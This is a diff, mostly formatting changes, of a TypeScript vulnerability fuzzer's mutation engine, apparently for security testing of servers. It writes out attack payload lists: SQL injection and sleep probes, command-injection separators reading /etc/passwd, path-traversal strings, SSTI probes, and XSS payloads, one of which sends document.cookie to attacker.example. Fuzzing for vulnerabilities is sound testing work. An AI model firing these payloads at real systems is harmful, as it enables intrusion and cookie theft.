@@ -19,10 +19,18 @@
  *   - All additions preserve the existing PromisePool + event architecture
  */
 
-import type { IPayloadGenerator, GeneratedPayload, GeneratorConfig } from '../generators/generator.interface';
-import type { IVulnerabilityDetector, DetectorContext, DetectionResult } from '../detectors/detector.interface';
-import { Fingerprinter } from '../fingerprint';
-import type { ServerFingerprint, FingerprintConfig } from '../fingerprint';
+import type {
+  IPayloadGenerator,
+  GeneratedPayload,
+  GeneratorConfig,
+} from "../generators/generator.interface";
+import type {
+  IVulnerabilityDetector,
+  DetectorContext,
+  DetectionResult,
+} from "../detectors/detector.interface";
+import { Fingerprinter } from "../fingerprint";
+import type { ServerFingerprint, FingerprintConfig } from "../fingerprint";
 
 // ---------------------------------------------------------------------------
 // Existing public interfaces (unchanged for backwards compatibility)
@@ -37,7 +45,10 @@ export interface FuzzerEngineConfig {
   concurrency?: number;
   stopOnFirstVulnerability?: boolean;
   onProgress?: (progress: FuzzingProgress) => void;
-  onVulnerability?: (detection: DetectionResult, payload: GeneratedPayload) => void;
+  onVulnerability?: (
+    detection: DetectionResult,
+    payload: GeneratedPayload,
+  ) => void;
   enableFingerprinting?: boolean;
   fingerprintConfig?: FingerprintConfig;
   onFingerprint?: (fingerprint: ServerFingerprint) => void;
@@ -63,7 +74,10 @@ export interface FuzzerEngineConfig {
   /** Max number of mutation rounds per interesting payload (default: 2) */
   maxMutationRounds?: number;
   /** Callback when an interesting (non-vulnerability) response is found */
-  onInterestingResponse?: (analysis: ResponseAnalysis, payload: GeneratedPayload) => void;
+  onInterestingResponse?: (
+    analysis: ResponseAnalysis,
+    payload: GeneratedPayload,
+  ) => void;
 }
 
 export interface FuzzingProgress {
@@ -117,15 +131,15 @@ export interface FuzzTarget {
 // ---------------------------------------------------------------------------
 
 /** Interest level returned by analyzeResponse. */
-export type InterestLevel = 'not_interesting' | 'interesting' | 'high_priority';
+export type InterestLevel = "not_interesting" | "interesting" | "high_priority";
 
 /** Reason why a response was flagged as interesting. */
 export type InterestReason =
-  | 'server_crash'        // HTTP 500 or MCP error code indicating internal failure
-  | 'timing_anomaly'      // Response took >2× average or >threshold ms
-  | 'structural_drift'    // Response body size changed drastically
-  | 'error_pattern_match' // Error message contains vulnerability indicators
-  | 'empty_response';     // Server returned nothing (possible crash/hang)
+  | "server_crash" // HTTP 500 or MCP error code indicating internal failure
+  | "timing_anomaly" // Response took >2× average or >threshold ms
+  | "structural_drift" // Response body size changed drastically
+  | "error_pattern_match" // Error message contains vulnerability indicators
+  | "empty_response"; // Server returned nothing (possible crash/hang)
 
 export interface ResponseAnalysis {
   /** Computed interest level */
@@ -185,21 +199,22 @@ export interface IMutationStrategy {
  * so the MutationEngine can route decisions correctly.
  */
 export const PayloadCategory = {
-  SQLI:           'sqli',
-  XSS:            'xss',
-  CMD_INJECTION:  'cmd-injection',
-  PATH_TRAVERSAL: 'path-traversal',
-  PROMPT_INJ:     'prompt-injection',
-  JSON_RPC:       'json-rpc',
-  SCHEMA_CONF:    'schema-confusion',
-  PROTO_FUZZ:     'protocol-fuzz',
-  REDOS:          'redos',
-  SSTI:           'ssti',            // Server-Side Template Injection
-  XXE:            'xxe',
-  SSRF:           'ssrf',
+  SQLI: "sqli",
+  XSS: "xss",
+  CMD_INJECTION: "cmd-injection",
+  PATH_TRAVERSAL: "path-traversal",
+  PROMPT_INJ: "prompt-injection",
+  JSON_RPC: "json-rpc",
+  SCHEMA_CONF: "schema-confusion",
+  PROTO_FUZZ: "protocol-fuzz",
+  REDOS: "redos",
+  SSTI: "ssti", // Server-Side Template Injection
+  XXE: "xxe",
+  SSRF: "ssrf",
 } as const;
 
-export type PayloadCategoryValue = typeof PayloadCategory[keyof typeof PayloadCategory];
+export type PayloadCategoryValue =
+  (typeof PayloadCategory)[keyof typeof PayloadCategory];
 
 // ---------------------------------------------------------------------------
 // Strategy selection rule types
@@ -215,7 +230,10 @@ interface SelectionRule {
   /** Human-readable label for debugging / telemetry */
   readonly label: string;
   /** Returns true when this rule should fire */
-  readonly matches: (category: string, reasons: ReadonlyArray<InterestReason>) => boolean;
+  readonly matches: (
+    category: string,
+    reasons: ReadonlyArray<InterestReason>,
+  ) => boolean;
   /** IDs of the strategies to include when this rule fires */
   readonly strategyIds: ReadonlyArray<string>;
   /**
@@ -255,8 +273,14 @@ const INHERENTLY_TIMED_CATEGORIES = new Set<string>([
  * likely vulnerable to Blind SQLi but the timing was a side-effect, not
  * the intent. We must now fire an explicit timing probe to confirm.
  */
-function needsCrossConfirmation(category: string, reasons: ReadonlyArray<InterestReason>): boolean {
-  return reasons.includes('timing_anomaly') && !INHERENTLY_TIMED_CATEGORIES.has(category);
+function needsCrossConfirmation(
+  category: string,
+  reasons: ReadonlyArray<InterestReason>,
+): boolean {
+  return (
+    reasons.includes("timing_anomaly") &&
+    !INHERENTLY_TIMED_CATEGORIES.has(category)
+  );
 }
 
 // ---------------------------------------------------------------------------
@@ -294,169 +318,176 @@ export class MutationEngine {
 
   /** Declarative selection matrix — evaluated top-to-bottom. */
   private readonly rules: ReadonlyArray<SelectionRule> = [
-
     // ── Tier 3: Cross-confirmation (highest priority, exclusive) ───────────
     // Fires when a timing anomaly occurs on a NON-timing payload.
     // This is the most actionable signal: the category was wrong, confirm blind vuln.
     {
-      label:       'cross-confirm: timing anomaly on non-timed payload',
-      priority:    3,
-      exclusive:   true,
-      matches:     (cat, reasons) => needsCrossConfirmation(cat, reasons),
-      strategyIds: ['timing-probe', 'sql-depth', 'quote-variation'],
+      label: "cross-confirm: timing anomaly on non-timed payload",
+      priority: 3,
+      exclusive: true,
+      matches: (cat, reasons) => needsCrossConfirmation(cat, reasons),
+      strategyIds: ["timing-probe", "sql-depth", "quote-variation"],
     },
 
     // ── Tier 2: Category × Signal combinations (high specificity) ──────────
 
     // SQLi + timing → blind injection confirmation
     {
-      label:       'sqli + timing_anomaly → blind sqli depth',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, reasons) =>
-        cat === PayloadCategory.SQLI && reasons.includes('timing_anomaly'),
-      strategyIds: ['timing-probe', 'sql-depth'],
+      label: "sqli + timing_anomaly → blind sqli depth",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, reasons) =>
+        cat === PayloadCategory.SQLI && reasons.includes("timing_anomaly"),
+      strategyIds: ["timing-probe", "sql-depth"],
     },
 
     // SQLi + error leaked → syntax repair to fully exploit
     {
-      label:       'sqli + error_pattern_match → syntax repair',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, reasons) =>
-        cat === PayloadCategory.SQLI && reasons.includes('error_pattern_match'),
-      strategyIds: ['quote-variation', 'sql-depth'],
+      label: "sqli + error_pattern_match → syntax repair",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, reasons) =>
+        cat === PayloadCategory.SQLI && reasons.includes("error_pattern_match"),
+      strategyIds: ["quote-variation", "sql-depth"],
     },
 
     // SQLi + structural drift → UNION-based extraction attempt
     {
-      label:       'sqli + structural_drift → union extraction',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, reasons) =>
-        cat === PayloadCategory.SQLI && reasons.includes('structural_drift'),
-      strategyIds: ['sql-depth', 'quote-variation', 'unicode-norm'],
+      label: "sqli + structural_drift → union extraction",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, reasons) =>
+        cat === PayloadCategory.SQLI && reasons.includes("structural_drift"),
+      strategyIds: ["sql-depth", "quote-variation", "unicode-norm"],
     },
 
     // SQLi + crash → stress the broken query parser
     {
-      label:       'sqli + server_crash → parser stress',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, reasons) =>
-        cat === PayloadCategory.SQLI && reasons.includes('server_crash'),
-      strategyIds: ['buffer-stress', 'truncation', 'quote-variation'],
+      label: "sqli + server_crash → parser stress",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, reasons) =>
+        cat === PayloadCategory.SQLI && reasons.includes("server_crash"),
+      strategyIds: ["buffer-stress", "truncation", "quote-variation"],
     },
 
     // Command injection + timing → shell sleep confirmation
     {
-      label:       'cmd-injection + timing_anomaly → shell timing probes',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, reasons) =>
-        cat === PayloadCategory.CMD_INJECTION && reasons.includes('timing_anomaly'),
-      strategyIds: ['timing-probe', 'cmd-separator'],
+      label: "cmd-injection + timing_anomaly → shell timing probes",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, reasons) =>
+        cat === PayloadCategory.CMD_INJECTION &&
+        reasons.includes("timing_anomaly"),
+      strategyIds: ["timing-probe", "cmd-separator"],
     },
 
     // Command injection + crash/drift → deepen separator search
     {
-      label:       'cmd-injection + crash|drift → separator depth',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, reasons) =>
+      label: "cmd-injection + crash|drift → separator depth",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, reasons) =>
         cat === PayloadCategory.CMD_INJECTION &&
-        (reasons.includes('server_crash') || reasons.includes('structural_drift')),
-      strategyIds: ['cmd-separator', 'null-byte', 'truncation'],
+        (reasons.includes("server_crash") ||
+          reasons.includes("structural_drift")),
+      strategyIds: ["cmd-separator", "null-byte", "truncation"],
     },
 
     // XSS + error leaked → WAF bypass via encoding
     {
-      label:       'xss + error_pattern_match → encoding bypass',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, reasons) =>
-        cat === PayloadCategory.XSS && reasons.includes('error_pattern_match'),
-      strategyIds: ['xss-escalation', 'unicode-norm'],
+      label: "xss + error_pattern_match → encoding bypass",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, reasons) =>
+        cat === PayloadCategory.XSS && reasons.includes("error_pattern_match"),
+      strategyIds: ["xss-escalation", "unicode-norm"],
     },
 
     // XSS + structural drift → DOM sink confirmation
     {
-      label:       'xss + structural_drift → dom sink escalation',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, reasons) =>
-        cat === PayloadCategory.XSS && reasons.includes('structural_drift'),
-      strategyIds: ['xss-escalation', 'unicode-norm', 'quote-variation'],
+      label: "xss + structural_drift → dom sink escalation",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, reasons) =>
+        cat === PayloadCategory.XSS && reasons.includes("structural_drift"),
+      strategyIds: ["xss-escalation", "unicode-norm", "quote-variation"],
     },
 
     // Path traversal + any signal → encoding variants + null-byte
     {
-      label:       'path-traversal + any signal → traversal depth',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, _reasons) => cat === PayloadCategory.PATH_TRAVERSAL,
-      strategyIds: ['path-traversal-depth', 'null-byte', 'unicode-norm'],
+      label: "path-traversal + any signal → traversal depth",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, _reasons) => cat === PayloadCategory.PATH_TRAVERSAL,
+      strategyIds: ["path-traversal-depth", "null-byte", "unicode-norm"],
     },
 
     // SSTI + any signal → template engine probe escalation
     {
-      label:       'ssti + any signal → template depth',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, _reasons) => cat === PayloadCategory.SSTI,
-      strategyIds: ['ssti-probe', 'unicode-norm', 'quote-variation'],
+      label: "ssti + any signal → template depth",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, _reasons) => cat === PayloadCategory.SSTI,
+      strategyIds: ["ssti-probe", "unicode-norm", "quote-variation"],
     },
 
     // ReDoS + timing → amplify the catastrophic backtracking pattern
     {
-      label:       'redos + timing_anomaly → backtracking amplification',
-      priority:    2,
-      exclusive:   true,
-      matches:     (cat, reasons) =>
-        cat === PayloadCategory.REDOS && reasons.includes('timing_anomaly'),
-      strategyIds: ['buffer-stress', 'truncation'],
+      label: "redos + timing_anomaly → backtracking amplification",
+      priority: 2,
+      exclusive: true,
+      matches: (cat, reasons) =>
+        cat === PayloadCategory.REDOS && reasons.includes("timing_anomaly"),
+      strategyIds: ["buffer-stress", "truncation"],
     },
 
     // ── Tier 1: Signal-only fallbacks (no category match above) ────────────
 
     // Any category: error leaked → always try syntax repair first
     {
-      label:       'any + error_pattern_match → quote repair',
-      priority:    1,
-      matches:     (_cat, reasons) => reasons.includes('error_pattern_match'),
-      strategyIds: ['quote-variation', 'sql-depth'],
+      label: "any + error_pattern_match → quote repair",
+      priority: 1,
+      matches: (_cat, reasons) => reasons.includes("error_pattern_match"),
+      strategyIds: ["quote-variation", "sql-depth"],
     },
 
     // Any category: crash → structural stress test
     {
-      label:       'any + server_crash → structural stress',
-      priority:    1,
-      matches:     (_cat, reasons) => reasons.includes('server_crash'),
-      strategyIds: ['buffer-stress', 'null-byte', 'truncation', 'bit-flip'],
+      label: "any + server_crash → structural stress",
+      priority: 1,
+      matches: (_cat, reasons) => reasons.includes("server_crash"),
+      strategyIds: ["buffer-stress", "null-byte", "truncation", "bit-flip"],
     },
 
     // Any category: drift → injection exploration
     {
-      label:       'any + structural_drift → injection exploration',
-      priority:    1,
-      matches:     (_cat, reasons) => reasons.includes('structural_drift'),
-      strategyIds: ['quote-variation', 'unicode-norm', 'null-byte'],
+      label: "any + structural_drift → injection exploration",
+      priority: 1,
+      matches: (_cat, reasons) => reasons.includes("structural_drift"),
+      strategyIds: ["quote-variation", "unicode-norm", "null-byte"],
     },
 
     // Any category: empty response → crash/hang probing
     {
-      label:       'any + empty_response → hang probing',
-      priority:    1,
-      matches:     (_cat, reasons) => reasons.includes('empty_response'),
-      strategyIds: ['timing-probe', 'buffer-stress', 'truncation'],
+      label: "any + empty_response → hang probing",
+      priority: 1,
+      matches: (_cat, reasons) => reasons.includes("empty_response"),
+      strategyIds: ["timing-probe", "buffer-stress", "truncation"],
     },
 
     // ── Tier 0: Catch-all (lowest priority, never exclusive) ───────────────
     {
-      label:       'catch-all: unknown interesting response',
-      priority:    0,
-      matches:     (_cat, _reasons) => true,
-      strategyIds: ['quote-variation', 'null-byte', 'truncation', 'bit-flip', 'unicode-norm'],
+      label: "catch-all: unknown interesting response",
+      priority: 0,
+      matches: (_cat, _reasons) => true,
+      strategyIds: [
+        "quote-variation",
+        "null-byte",
+        "truncation",
+        "bit-flip",
+        "unicode-norm",
+      ],
     },
   ];
 
@@ -477,7 +508,7 @@ export class MutationEngine {
       ...(customStrategies ?? []),
     ];
 
-    this.strategyMap = new Map(builtIn.map(s => [s.id, s]));
+    this.strategyMap = new Map(builtIn.map((s) => [s.id, s]));
   }
 
   /**
@@ -491,28 +522,29 @@ export class MutationEngine {
   mutate(
     payload: GeneratedPayload,
     reasons: InterestReason[],
-    round: number
+    round: number,
   ): GeneratedPayload[] {
-    const selected   = this.selectStrategies(payload.category, reasons);
+    const selected = this.selectStrategies(payload.category, reasons);
     const mutations: GeneratedPayload[] = [];
 
     for (const strategy of selected) {
       const variants = strategy.mutate(payload);
       mutations.push(
-        ...variants.map(v => ({
+        ...variants.map((v) => ({
           ...v,
           metadata: {
             ...v.metadata,
-            isMutation:       true,
-            mutationRound:    round,
+            isMutation: true,
+            mutationRound: round,
             mutationStrategy: strategy.id,
             selectionReasons: reasons.slice(),
             originalCategory: payload.category,
-            originalPayload:  typeof payload.value === 'string'
-              ? payload.value.slice(0, 100)
-              : JSON.stringify(payload.value).slice(0, 100),
+            originalPayload:
+              typeof payload.value === "string"
+                ? payload.value.slice(0, 100)
+                : JSON.stringify(payload.value).slice(0, 100),
           },
-        }))
+        })),
       );
     }
 
@@ -533,26 +565,28 @@ export class MutationEngine {
    */
   private selectStrategies(
     category: string,
-    reasons: ReadonlyArray<InterestReason>
+    reasons: ReadonlyArray<InterestReason>,
   ): IMutationStrategy[] {
-    const matchingRules = this.rules.filter(r => r.matches(category, reasons));
+    const matchingRules = this.rules.filter((r) =>
+      r.matches(category, reasons),
+    );
 
     if (matchingRules.length === 0) {
       // Should never happen because the catch-all always matches, but be safe
       return [...this.strategyMap.values()];
     }
 
-    const maxPriority   = Math.max(...matchingRules.map(r => r.priority));
-    const topRules      = matchingRules.filter(r => r.priority === maxPriority);
-    const hasExclusive  = topRules.some(r => r.exclusive === true);
+    const maxPriority = Math.max(...matchingRules.map((r) => r.priority));
+    const topRules = matchingRules.filter((r) => r.priority === maxPriority);
+    const hasExclusive = topRules.some((r) => r.exclusive === true);
 
     // Collect strategy IDs from the appropriate rule set
     const sourceRules = hasExclusive
-      ? topRules                // exclusive mode: only top-priority rules
-      : matchingRules;          // inclusive mode: union of all matching rules
+      ? topRules // exclusive mode: only top-priority rules
+      : matchingRules; // inclusive mode: union of all matching rules
 
     const selectedIds = new Set<string>(
-      sourceRules.flatMap(r => r.strategyIds)
+      sourceRules.flatMap((r) => r.strategyIds),
     );
 
     // Resolve IDs to strategy instances
@@ -576,7 +610,7 @@ export class MutationEngine {
 
 /** Helper: coerce payload value to string for string-based mutations. */
 function payloadToString(payload: GeneratedPayload): string {
-  return typeof payload.value === 'string'
+  return typeof payload.value === "string"
     ? payload.value
     : JSON.stringify(payload.value);
 }
@@ -585,7 +619,7 @@ function payloadToString(payload: GeneratedPayload): string {
 function cloneWith(
   base: GeneratedPayload,
   value: string,
-  descSuffix: string
+  descSuffix: string,
 ): GeneratedPayload {
   return {
     ...base,
@@ -596,8 +630,8 @@ function cloneWith(
 }
 
 class SqlInjectionDepthStrategy implements IMutationStrategy {
-  readonly id   = 'sql-depth';
-  readonly name = 'SQL Injection Depth';
+  readonly id = "sql-depth";
+  readonly name = "SQL Injection Depth";
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
     const base = payloadToString(payload);
@@ -609,70 +643,74 @@ class SqlInjectionDepthStrategy implements IMutationStrategy {
       "'; WAITFOR DELAY '0:0:5'--",
     ];
     return suffixes.map((s, i) =>
-      cloneWith(payload, base + s, `sql-suffix-${i}`)
+      cloneWith(payload, base + s, `sql-suffix-${i}`),
     );
   }
 }
 
 class NullByteInsertionStrategy implements IMutationStrategy {
-  readonly id   = 'null-byte';
-  readonly name = 'Null Byte Insertion';
+  readonly id = "null-byte";
+  readonly name = "Null Byte Insertion";
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
     const base = payloadToString(payload);
-    const mid  = Math.floor(base.length / 2);
+    const mid = Math.floor(base.length / 2);
     return [
-      cloneWith(payload, base + '%00',          'null-suffix'),
-      cloneWith(payload, '%00' + base,          'null-prefix'),
-      cloneWith(payload, base.slice(0, mid) + '%00' + base.slice(mid), 'null-mid'),
-      cloneWith(payload, base + '\x00',         'null-raw-suffix'),
+      cloneWith(payload, base + "%00", "null-suffix"),
+      cloneWith(payload, "%00" + base, "null-prefix"),
+      cloneWith(
+        payload,
+        base.slice(0, mid) + "%00" + base.slice(mid),
+        "null-mid",
+      ),
+      cloneWith(payload, base + "\x00", "null-raw-suffix"),
     ];
   }
 }
 
 class BufferStressStrategy implements IMutationStrategy {
-  readonly id   = 'buffer-stress';
-  readonly name = 'Buffer Stress';
+  readonly id = "buffer-stress";
+  readonly name = "Buffer Stress";
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
     const base = payloadToString(payload);
     return [
-      cloneWith(payload, base.repeat(10),   'repeat-10'),
-      cloneWith(payload, base.repeat(100),  'repeat-100'),
-      cloneWith(payload, 'A'.repeat(1024),  'long-a-1k'),
-      cloneWith(payload, 'A'.repeat(65536),  'long-a-64k'),
-      cloneWith(payload, base + 'A'.repeat(1024), 'padded-1k'),
+      cloneWith(payload, base.repeat(10), "repeat-10"),
+      cloneWith(payload, base.repeat(100), "repeat-100"),
+      cloneWith(payload, "A".repeat(1024), "long-a-1k"),
+      cloneWith(payload, "A".repeat(65536), "long-a-64k"),
+      cloneWith(payload, base + "A".repeat(1024), "padded-1k"),
     ];
   }
 }
 
 class QuoteVariationStrategy implements IMutationStrategy {
-  readonly id   = 'quote-variation';
-  readonly name = 'Quote Variation';
+  readonly id = "quote-variation";
+  readonly name = "Quote Variation";
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
     const base = payloadToString(payload);
     return [
-      cloneWith(payload, `'${base}'`,   'single-wrapped'),
-      cloneWith(payload, `"${base}"`,   'double-wrapped'),
-      cloneWith(payload, `\`${base}\``, 'backtick-wrapped'),
-      cloneWith(payload, base + "'",    'single-append'),
-      cloneWith(payload, base + '"',    'double-append'),
-      cloneWith(payload, base + "\\",   'backslash-append'),
+      cloneWith(payload, `'${base}'`, "single-wrapped"),
+      cloneWith(payload, `"${base}"`, "double-wrapped"),
+      cloneWith(payload, `\`${base}\``, "backtick-wrapped"),
+      cloneWith(payload, base + "'", "single-append"),
+      cloneWith(payload, base + '"', "double-append"),
+      cloneWith(payload, base + "\\", "backslash-append"),
     ];
   }
 }
 
 class BitFlipStrategy implements IMutationStrategy {
-  readonly id   = 'bit-flip';
-  readonly name = 'Bit Flip';
+  readonly id = "bit-flip";
+  readonly name = "Bit Flip";
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
-    const base    = payloadToString(payload);
+    const base = payloadToString(payload);
     const results: GeneratedPayload[] = [];
     // Flip first, middle, and last characters
     const positions = [0, Math.floor(base.length / 2), base.length - 1].filter(
-      p => p >= 0 && p < base.length
+      (p) => p >= 0 && p < base.length,
     );
     for (const pos of positions) {
       const flipped =
@@ -686,21 +724,21 @@ class BitFlipStrategy implements IMutationStrategy {
 }
 
 class UnicodeNormalisationStrategy implements IMutationStrategy {
-  readonly id   = 'unicode-norm';
-  readonly name = 'Unicode Normalisation';
+  readonly id = "unicode-norm";
+  readonly name = "Unicode Normalisation";
 
   // Lookalike substitutions that bypass naive string-match filters
   private readonly substitutions: Array<[string, string]> = [
-    ['<', '\uFE64'],   // ﹤ SMALL LESS-THAN SIGN
-    ['>', '\uFE65'],   // ﹥ SMALL GREATER-THAN SIGN
-    ["'", '\u2019'],   // ' RIGHT SINGLE QUOTATION MARK
-    ['"', '\u201D'],   // " RIGHT DOUBLE QUOTATION MARK
-    ['/', '\u2215'],   // ∕ DIVISION SLASH
-    ['.', '\uFF0E'],   // ． FULLWIDTH FULL STOP
+    ["<", "\uFE64"], // ﹤ SMALL LESS-THAN SIGN
+    [">", "\uFE65"], // ﹥ SMALL GREATER-THAN SIGN
+    ["'", "\u2019"], // ' RIGHT SINGLE QUOTATION MARK
+    ['"', "\u201D"], // " RIGHT DOUBLE QUOTATION MARK
+    ["/", "\u2215"], // ∕ DIVISION SLASH
+    [".", "\uFF0E"], // ． FULLWIDTH FULL STOP
   ];
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
-    const base    = payloadToString(payload);
+    const base = payloadToString(payload);
     const results: GeneratedPayload[] = [];
 
     for (const [original, lookalike] of this.substitutions) {
@@ -709,37 +747,51 @@ class UnicodeNormalisationStrategy implements IMutationStrategy {
           cloneWith(
             payload,
             base.split(original).join(lookalike),
-            `unicode-${original.charCodeAt(0).toString(16)}`
-          )
+            `unicode-${original.charCodeAt(0).toString(16)}`,
+          ),
         );
       }
     }
 
     // Also add an overlong UTF-8 encoded slash (classic path traversal bypass)
-    results.push(cloneWith(payload, base.replace(/\//g, '%c0%af'), 'overlong-slash'));
+    results.push(
+      cloneWith(payload, base.replace(/\//g, "%c0%af"), "overlong-slash"),
+    );
 
     return results;
   }
 }
 
 class TruncationStrategy implements IMutationStrategy {
-  readonly id   = 'truncation';
-  readonly name = 'Truncation';
+  readonly id = "truncation";
+  readonly name = "Truncation";
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
-    const base    = payloadToString(payload);
+    const base = payloadToString(payload);
     const results: GeneratedPayload[] = [];
 
     // Progressive truncation: 75%, 50%, 25%, single char
     for (const fraction of [0.75, 0.5, 0.25]) {
       const len = Math.max(1, Math.floor(base.length * fraction));
-      results.push(cloneWith(payload, base.slice(0, len), `trunc-${Math.round(fraction * 100)}pct`));
+      results.push(
+        cloneWith(
+          payload,
+          base.slice(0, len),
+          `trunc-${Math.round(fraction * 100)}pct`,
+        ),
+      );
     }
 
     // One byte over a common boundary
     for (const boundary of [127, 255, 1023, 65535]) {
       if (base.length < boundary + 2) continue;
-      results.push(cloneWith(payload, base.slice(0, boundary + 1), `trunc-boundary-${boundary}`));
+      results.push(
+        cloneWith(
+          payload,
+          base.slice(0, boundary + 1),
+          `trunc-boundary-${boundary}`,
+        ),
+      );
     }
 
     return results;
@@ -747,8 +799,8 @@ class TruncationStrategy implements IMutationStrategy {
 }
 
 class TimingProbeStrategy implements IMutationStrategy {
-  readonly id   = 'timing-probe';
-  readonly name = 'Timing Probe';
+  readonly id = "timing-probe";
+  readonly name = "Timing Probe";
 
   // Classic sleep payloads for different backends
   private readonly probes = [
@@ -764,115 +816,111 @@ class TimingProbeStrategy implements IMutationStrategy {
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
     const base = payloadToString(payload);
     return this.probes.map((probe, i) =>
-      cloneWith(
-        payload,
-        base + probe,
-        `timing-probe-${i}`
-      )
+      cloneWith(payload, base + probe, `timing-probe-${i}`),
     );
   }
 }
 
 class CmdSeparatorStrategy implements IMutationStrategy {
-  readonly id   = 'cmd-separator';
-  readonly name = 'Command Separator Depth';
+  readonly id = "cmd-separator";
+  readonly name = "Command Separator Depth";
 
   private readonly separators = [
-    '; sleep 5',
-    '| sleep 5',
-    '|| sleep 5',
-    '&& sleep 5',
-    '& timeout /T 5',
-    '\n sleep 5',
-    '\r\n sleep 5',
-    '`sleep 5`',
-    '$(sleep 5)',
-    '; ping -c 5 127.0.0.1',
-    '| ping -n 5 127.0.0.1',
-    '; cat /etc/passwd',
-    '& type C:\\Windows\\win.ini',
+    "; sleep 5",
+    "| sleep 5",
+    "|| sleep 5",
+    "&& sleep 5",
+    "& timeout /T 5",
+    "\n sleep 5",
+    "\r\n sleep 5",
+    "`sleep 5`",
+    "$(sleep 5)",
+    "; ping -c 5 127.0.0.1",
+    "| ping -n 5 127.0.0.1",
+    "; cat /etc/passwd",
+    "& type C:\\Windows\\win.ini",
   ];
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
     const base = payloadToString(payload);
     return this.separators.map((sep, i) =>
-      cloneWith(payload, base + sep, `cmd-sep-${i}`)
+      cloneWith(payload, base + sep, `cmd-sep-${i}`),
     );
   }
 }
 
 class XssEscalationStrategy implements IMutationStrategy {
-  readonly id   = 'xss-escalation';
-  readonly name = 'XSS Escalation';
+  readonly id = "xss-escalation";
+  readonly name = "XSS Escalation";
 
   private readonly escalations = [
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
     '"><script>alert(1)</script>',
     "';alert(1)//",
-    '{{7*7}}',
+    "{{7*7}}",
     '<iframe src="javascript:alert(1)">',
-    '<details open ontoggle=alert(1)>',
-    'javascript:alert(1)',
-    '<body onpageshow=alert(1)>',
+    "<details open ontoggle=alert(1)>",
+    "javascript:alert(1)",
+    "<body onpageshow=alert(1)>",
     '"><img src=/ onerror=fetch(`//attacker.example?c=`+document.cookie)>',
   ];
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
     const base = payloadToString(payload);
     return this.escalations.map((esc, i) =>
-      cloneWith(payload, base + esc, `xss-esc-${i}`)
+      cloneWith(payload, base + esc, `xss-esc-${i}`),
     );
   }
 }
 
 class PathTraversalDepthStrategy implements IMutationStrategy {
-  readonly id   = 'path-traversal-depth';
-  readonly name = 'Path Traversal Depth';
+  readonly id = "path-traversal-depth";
+  readonly name = "Path Traversal Depth";
 
   private readonly sequences = [
-    '../../../etc/passwd',
-    '..\\..\\..\\Windows\\win.ini',
-    '....//....//etc/passwd',
-    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-    '..%252f..%252fetc%252fpasswd',
-    '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
-    '../../../etc/passwd%00.jpg',
-    '/etc/passwd',
-    'C:\\Windows\\win.ini',
-    '../../../proc/self/environ',
-    '../../../var/log/apache2/access.log',
+    "../../../etc/passwd",
+    "..\\..\\..\\Windows\\win.ini",
+    "....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252fetc%252fpasswd",
+    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+    "../../../etc/passwd%00.jpg",
+    "/etc/passwd",
+    "C:\\Windows\\win.ini",
+    "../../../proc/self/environ",
+    "../../../var/log/apache2/access.log",
   ];
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
     const base = payloadToString(payload);
     return this.sequences.map((seq, i) =>
-      cloneWith(payload, base + seq, `path-trav-${i}`)
+      cloneWith(payload, base + seq, `path-trav-${i}`),
     );
   }
 }
 
 class SstiProbeStrategy implements IMutationStrategy {
-  readonly id   = 'ssti-probe';
-  readonly name = 'SSTI Probe';
+  readonly id = "ssti-probe";
+  readonly name = "SSTI Probe";
 
   private readonly probes = [
-    '{{7*7}}',
-    '${7*7}',
-    '#{7*7}',
-    '<%= 7*7 %>',
+    "{{7*7}}",
+    "${7*7}",
+    "#{7*7}",
+    "<%= 7*7 %>",
     '{{7*"7"}}',
     '${"freemarker".toUpperCase()}',
-    '{{config}}',
-    '{{self.__dict__}}',
-    '*{7*7}',
-    '@{7*7}',
+    "{{config}}",
+    "{{self.__dict__}}",
+    "*{7*7}",
+    "@{7*7}",
   ];
 
   mutate(payload: GeneratedPayload): GeneratedPayload[] {
     const base = payloadToString(payload);
     return this.probes.map((probe, i) =>
-      cloneWith(payload, base + probe, `ssti-${i}`)
+      cloneWith(payload, base + probe, `ssti-${i}`),
     );
   }
 }
@@ -891,7 +939,7 @@ class SstiProbeStrategy implements IMutationStrategy {
  * items concurrently.
  */
 class DynamicPayloadQueue {
-  private high:   GeneratedPayload[] = [];
+  private high: GeneratedPayload[] = [];
   private normal: GeneratedPayload[] = [];
   private _totalEnqueued = 0;
 
@@ -946,7 +994,7 @@ class PromisePool<T, R> {
       onResult?: (result: R, item: T, index: number) => void;
       onError?: (error: Error, item: T, index: number) => void;
